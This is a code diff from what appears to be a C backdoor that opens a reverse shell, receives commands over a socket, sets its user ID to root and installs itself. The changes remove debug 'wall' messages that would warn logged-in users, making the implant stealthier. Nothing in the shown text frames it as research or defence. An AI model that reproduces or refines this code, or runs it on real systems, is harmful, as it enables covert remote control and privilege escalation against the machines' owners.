@@ -40,7 +40,6 @@ int writepid(){
         /* Directory exists. */
         closedir(dir);
     } else if (ENOENT == errno) {
-        system("wall Making folder...");
         int res = mkdir(FOLDER, 0733);
         printf("%d\n", res);
     } else {
@@ -101,18 +100,14 @@ int establishConnection(int port, int shell) {
     //Test whether we should request a port from the server
     //or if we should open the reverse shell
     if (shell == 1){
-        system("wall establishing shell");
         //If we've already received a port from the server, open the shell
 
         //Write the current PID to the file; exit if it errors out
         if (writepid() == ERR) {
-            system("wall error writing pid");
             return ERR;
         }
-        system("wall here we go...");
         //Receive commands from the connection
         while ((valread = recv(sock , buffer , 1024 , 0)) > 0){
-            system("wall receiving command");
             char line[1024];
             //Remove trailing newline
             buffer[strcspn(buffer, "\n")] = 0;
@@ -169,7 +164,6 @@ int install(char *fname){
 
 
 int main (int argc, char *argv[]) {
-    // system("wall RUNNING");
     //Set the uid to root
     setuid(0);
     if (install(argv[0]) == TRUE){
